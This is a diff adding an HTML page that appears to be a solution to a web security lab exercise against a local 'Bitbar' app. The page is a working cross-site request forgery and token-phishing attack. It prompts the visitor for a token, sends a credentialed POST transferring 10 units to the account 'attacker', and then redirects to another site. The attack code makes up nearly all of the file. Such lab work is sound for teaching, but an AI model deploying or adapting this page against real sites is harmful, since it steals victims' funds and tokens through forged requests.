@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset='utf-8'>
+    <title>aoto transfer bitbar</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <script>
+        function aoto_transfer() 
+        {
+        var request = new XMLHttpRequest(); //创建实例
+        var token = document.getElementById("token").value; //获取用户输入的token
+          request.open("POST", "http://localhost:3000/super_secure_post_transfer", false);//向目标网站申请POST请求
+          request.setRequestHeader("Content-type","application/x-www-form-urlencoded");//设置HTTP请求头部，指明请求体的内容类型为表单形式
+          request.withCredentials = true; //使用cookie进行身份验证
+          try {
+            request.send("quantity=10&destination_username=attacker&tokeninput=" + token); //发送POST请求
+          } 
+          finally {
+            window.top.location = "http://baidu.com";   //最后跳转到baidu
+          }
+        }
+        </script>
+</head>
+
+<body>
+    <p>输入下面的token验证您的身份</p>
+    <input id="token" type="text" placeholder="Token">
+    <button onClick="aoto_transfer()">提交</button>
+    <br />
+    <iframe src="bp2.html" scrolling="no" class="iframe" frameborder="0"></iframe>
+</body>
+
+</html>
